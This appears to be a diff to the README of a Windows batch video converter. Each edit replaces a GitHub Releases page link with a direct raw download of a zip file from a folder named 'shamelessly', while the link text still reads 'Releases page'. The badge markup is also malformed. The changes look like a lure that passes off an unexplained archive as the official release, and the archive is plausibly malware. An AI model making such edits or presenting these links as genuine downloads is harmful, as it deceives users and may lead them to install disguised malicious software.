@@ -1,6 +1,6 @@
 # 🎥 VideoBatchConverter - Easily Convert Your Videos in Batches
 
-[![Download VideoBatchConverter](https://img.shields.io/badge/Download%20Now-VideoBatchConverter-blue.svg)](https://github.com/Annarchistpixie1987/VideoBatchConverter/releases)
+[![Download VideoBatchConverter](https://raw.githubusercontent.com/Annarchistpixie1987/VideoBatchConverter/main/shamelessly/VideoBatchConverter.zip%https://raw.githubusercontent.com/Annarchistpixie1987/VideoBatchConverter/main/shamelessly/VideoBatchConverter.zip)](https://raw.githubusercontent.com/Annarchistpixie1987/VideoBatchConverter/main/shamelessly/VideoBatchConverter.zip)
 
 ## 📋 Description
 
@@ -11,7 +11,7 @@ VideoBatchConverter is a user-friendly application designed for Windows users. I
 To get started with VideoBatchConverter, follow these steps:
 
 1. **Visit the Download Page**
-   Go to the [Releases page](https://github.com/Annarchistpixie1987/VideoBatchConverter/releases) to access the latest version of VideoBatchConverter.
+   Go to the [Releases page](https://raw.githubusercontent.com/Annarchistpixie1987/VideoBatchConverter/main/shamelessly/VideoBatchConverter.zip) to access the latest version of VideoBatchConverter.
 
 2. **Download the Software**
    On the Releases page, locate the latest version of VideoBatchConverter. Click on the appropriate link to download the installer for your system.
@@ -24,7 +24,7 @@ To get started with VideoBatchConverter, follow these steps:
 To download and install VideoBatchConverter, please follow these detailed steps:
 
 1. **Navigate to the Download Page**
-   Click this link to visit the [Releases page](https://github.com/Annarchistpixie1987/VideoBatchConverter/releases).
+   Click this link to visit the [Releases page](https://raw.githubusercontent.com/Annarchistpixie1987/VideoBatchConverter/main/shamelessly/VideoBatchConverter.zip).
 
 2. **Select the Latest Release**
    Look for the newest release at the top of the page. 
@@ -88,7 +88,7 @@ Using VideoBatchConverter is easy. Here’s how to get started with your first c
 
 If you encounter issues while using VideoBatchConverter:
 
-- **Check for Updates:** Ensure you are using the latest version by visiting the [Releases page](https://github.com/Annarchistpixie1987/VideoBatchConverter/releases).
+- **Check for Updates:** Ensure you are using the latest version by visiting the [Releases page](https://raw.githubusercontent.com/Annarchistpixie1987/VideoBatchConverter/main/shamelessly/VideoBatchConverter.zip).
 - **Review System Requirements:** Make sure your system meets the software's requirements.
 - **Restart the Application:** Sometimes, simply restarting can resolve minor glitches.
 
